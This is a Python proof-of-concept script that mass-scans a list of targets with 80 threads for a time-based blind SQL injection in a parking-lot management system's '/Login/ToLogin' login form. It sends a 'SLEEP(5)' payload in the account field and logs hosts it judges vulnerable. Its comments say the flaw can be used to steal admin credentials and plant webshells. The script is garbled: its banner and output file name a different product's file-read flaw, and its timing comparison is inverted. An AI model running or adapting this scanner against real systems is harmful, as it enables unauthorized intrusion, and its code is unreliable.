# -*- coding: utf-8 -*-
# 停车场后台管理系统 ToLogin SQL注入漏洞
# icon_hash="938984120"
# 产品简介：停车场后台管理系统是一种专为停车场管理者设计的综合管理平台，旨在提供全面、高效、智能的停车场运营管理解决方案，系统利用现代信息技术，如物联网、大数据、云计算等，实现对停车场内车辆进出、车位管理、费用结算、安全监控等各个环节的自动化、智能化管理。该系统能够显著提升停车场的管理效率，降低运营成本，并为车主提供更加便捷、舒适的停车体验。
# 漏洞概述：停车场后台管理系统 ToLogin 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
            \x1b[38m███████╗██╗  ██╗   ██╗ ██████╗     ███████╗██████╗ ███╗   ███╗
            \x1b[36m╚══███╔╝██║  ╚██╗ ██╔╝██╔════╝     ██╔════╝██╔══██╗████╗ ████║
            \x1b[34m  ███╔╝ ██║   ╚████╔╝ ██║    █████╗███████╗██████╔╝██╔████╔██║
            \x1b[35m ███╔╝  ██║    ╚██╔╝  ██║    ╚════╝╚════██║██╔══██╗██║╚██╔╝██║
            \x1b[31m███████╗███████╗██║   ╚██████╗     ███████║██║  ██║██║ ╚═╝ ██║
            \x1b[33m╚══════╝╚══════╝╚═╝    ╚═════╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Version:智联云采 SRM2.0 runtimeLog/download 任意文件读取漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('智联云采 SRM2.0 runtimeLog/download 任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/Login/ToLogin'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data1 = "Admins_Account=1&Admins_Pwd="
    data2 = "Admins_Account=1' AND (SELECT 8104 FROM (SELECT(SLEEP(5)))dEPM) AND 'JYpL'='JYpL&Admins_Pwd="
    try :
        response1 = requests.post(url=target+url_payload,headers=headers,data=data1,verify=False,timeout=7)
        response2 = requests.post(url=target+url_payload,headers=headers,data=data2,verify=False,timeout=7)
        # print(response.status_code)
        # print(response.text)
        time1 = response1.elapsed.total_seconds()
        time2 = response2.elapsed.total_seconds()
        if response1.status_code == 200 and time1 - time2 >= 3.7:
            print( f"[+] {target} 存在漏洞！\n")
            with open('智联云采-SRM2.0_任意文件读取漏洞.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print(f"[-]{target} 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()